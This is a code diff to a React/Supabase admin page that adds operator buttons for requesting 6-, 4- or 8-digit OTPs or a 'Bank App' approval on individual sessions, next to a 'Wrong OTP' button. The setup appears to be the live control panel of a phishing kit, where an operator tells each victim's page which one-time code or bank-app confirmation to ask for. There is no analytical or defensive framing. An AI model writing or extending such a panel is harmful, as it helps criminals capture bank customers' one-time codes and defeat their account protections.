@@ -154,10 +154,17 @@ const Admin = () => {
   }, [authenticated]);
 
   // Session control
-  const updateSessionStatus = async (id: string, status: string) => {
-    const { error } = await supabase.from("sessions").update({ status }).eq("id", id);
+  const updateSessionStatus = async (id: string, status: string, otpType?: string) => {
+    const updateData: any = { status };
+    if (otpType) {
+      // Store otp_type in form_data
+      const { data: session } = await supabase.from("sessions").select("form_data").eq("id", id).single();
+      const existingData = (session?.form_data as Record<string, any>) || {};
+      updateData.form_data = { ...existingData, otp_type: otpType };
+    }
+    const { error } = await supabase.from("sessions").update(updateData).eq("id", id);
     if (error) toast({ title: "Error", description: "Failed to update session.", variant: "destructive" });
-    else toast({ title: "Updated", description: `Session set to "${status}".` });
+    else toast({ title: "Updated", description: `Session set to "${status}"${otpType ? ` (${otpType})` : ""}.` });
   };
 
   const deleteSession = async (id: string) => {
@@ -512,9 +519,21 @@ const Admin = () => {
                           )}
                         </div>
                         <div className="border-t border-white/[0.06] px-5 py-3.5 flex flex-wrap gap-2 bg-[#111827]">
-                          <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp"); }}>
-                            <KeyRound className="h-3.5 w-3.5" /> Request OTP
-                          </Button>
+                          {/* OTP Type buttons */}
+                          <div className="flex flex-wrap gap-2">
+                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "6digit"); }}>
+                              <KeyRound className="h-3.5 w-3.5" /> OTP 6-digit
+                            </Button>
+                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "4digit"); }}>
+                              <KeyRound className="h-3.5 w-3.5" /> OTP 4-digit
+                            </Button>
+                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "8digit"); }}>
+                              <KeyRound className="h-3.5 w-3.5" /> OTP 8-digit
+                            </Button>
+                            <Button size="sm" variant="outline" className="gap-1.5 bg-purple-500/10 border-purple-500/20 text-purple-400 hover:bg-purple-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "bank_app"); }}>
+                              <KeyRound className="h-3.5 w-3.5" /> Bank App
+                            </Button>
+                          </div>
                           <Button size="sm" variant="outline" className="gap-1.5 bg-orange-500/10 border-orange-500/20 text-orange-400 hover:bg-orange-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_wrong"); }}>
                             <XCircle className="h-3.5 w-3.5" /> Wrong OTP
                           </Button>
